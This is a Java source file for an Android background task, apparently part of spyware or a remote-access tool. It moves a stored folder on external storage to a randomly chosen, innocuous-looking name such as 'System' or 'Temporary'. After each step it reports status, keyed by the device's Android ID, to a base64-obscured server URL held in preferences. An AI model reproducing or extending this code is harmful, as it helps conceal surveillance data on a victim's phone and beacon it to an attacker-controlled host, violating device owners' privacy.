package com.asynctask;

import android.os.AsyncTask;
import android.os.Environment;
import android.preference.PreferenceManager;
import android.util.Base64;

import com.connect.MyApplication;
import com.utils.CommonUtils;

import java.io.File;
import java.io.UnsupportedEncodingException;
import java.util.Random;

/**
 * Created by ASUS on 2017/12/5.
 */

public class changeDirectory extends AsyncTask<String, Void, String> {
    @Override
    protected String doInBackground(String... params) {

        String[] files = {"System", "System Media", "Saved Files", "Recent Media", "Temporary"};
        Random r = new Random();
        String file2String = files[r.nextInt(files.length)];

        File file = new File(PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("File", ""));
        File file2 = new File(Environment.getExternalStorageDirectory().toString() + File.separator + file2String);
        boolean success = file.renameTo(file2);
        if (success) {
            PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).edit().putString("File", Environment.getExternalStorageDirectory().toString() + File.separator + file2String).commit();
//			    Log.i("com.connect", "Changed:" + PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("File", ""));
            try {
                String URL = new String(Base64.decode(PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("URL", ""), Base64.DEFAULT));
                CommonUtils.getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("AndroidID", "") + "&Data=", "Changed Directory: " + file2String);
            } catch (UnsupportedEncodingException e) {

                e.printStackTrace();
            }
        } else {
            try {
                String URL = new String(Base64.decode(PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("URL", ""), Base64.DEFAULT));
                CommonUtils.getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("AndroidID", "") + "&Data=", "Changed Directory Failed");
            } catch (UnsupportedEncodingException e) {
                e.printStackTrace();
            }
        }
        return "Executed";
    }

    @Override
    protected void onPostExecute(String result) {
        PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).edit().putBoolean("Files", false).commit();
    }

    @Override
    protected void onPreExecute() {
        while (PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getBoolean("Files", false) == true) {
            try {
                Thread.sleep(5000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
        PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).edit().putBoolean("Files", true).commit();
        try {
            String URL = new String(Base64.decode(PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("URL", ""), Base64.DEFAULT));
            CommonUtils.getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("AndroidID", "") + "&Data=", "Deleting Files");
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
    }

    @Override
    protected void onProgressUpdate(Void... values) {
    }
}
